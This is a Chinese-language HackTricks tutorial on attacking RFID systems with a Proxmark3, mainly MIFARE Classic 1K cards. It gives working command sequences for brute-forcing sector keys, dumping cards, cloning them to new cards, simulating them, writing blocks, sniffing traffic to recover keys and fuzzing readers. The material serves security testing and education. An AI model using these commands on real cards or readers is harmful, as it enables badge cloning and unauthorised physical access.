# Proxmark 3

{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **在 Twitter 上关注** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。

</details>
{% endhint %}

## 使用 Proxmark3 攻击 RFID 系统

您需要做的第一件事是拥有一个 [**Proxmark3**](https://proxmark.com) 并 [**安装软件及其依赖项**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)。

### 攻击 MIFARE Classic 1KB

它有 **16 个扇区**，每个扇区有 **4 个块**，每个块包含 **16B**。UID 位于扇区 0 块 0（无法更改）。\
要访问每个扇区，您需要 **2 个密钥**（**A** 和 **B**），这些密钥存储在 **每个扇区的块 3**（扇区尾部）。扇区尾部还存储 **访问位**，这些位使用 2 个密钥提供 **每个块的读写**权限。\
2 个密钥可以用于提供读取权限，如果您知道第一个密钥，则可以写入，如果您知道第二个密钥（例如）。

可以执行多种攻击
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Proxmark3 允许执行其他操作，例如 **窃听** **标签与读卡器之间的通信** 以尝试找到敏感数据。在这张卡中，您可以仅仅嗅探通信并计算使用的密钥，因为 **使用的加密操作很弱**，并且知道明文和密文后，您可以计算它（`mfkey64` 工具）。

### 原始命令

物联网系统有时使用 **非品牌或非商业标签**。在这种情况下，您可以使用 Proxmark3 向标签发送自定义 **原始命令**。
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
通过这些信息，您可以尝试搜索有关卡片的信息以及与其通信的方法。Proxmark3 允许发送原始命令，例如：`hf 14a raw -p -b 7 26`

### 脚本

Proxmark3 软件附带了一份预加载的 **自动化脚本** 列表，您可以使用这些脚本来执行简单任务。要检索完整列表，请使用 `script list` 命令。接下来，使用 `script run` 命令，后跟脚本名称：
```
proxmark3> script run mfkeys
```
您可以创建一个脚本来**模糊标签读取器**，只需编写一个**Lua脚本**，随机化一个或多个随机**字节**，并检查**读取器是否崩溃**。

{% hint style="success" %}
学习和实践AWS黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks培训AWS红队专家(ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习和实践GCP黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks培训GCP红队专家(GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持HackTricks</summary>

* 查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或**关注**我们的**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub库提交PR来分享黑客技巧。

</details>
{% endhint %}
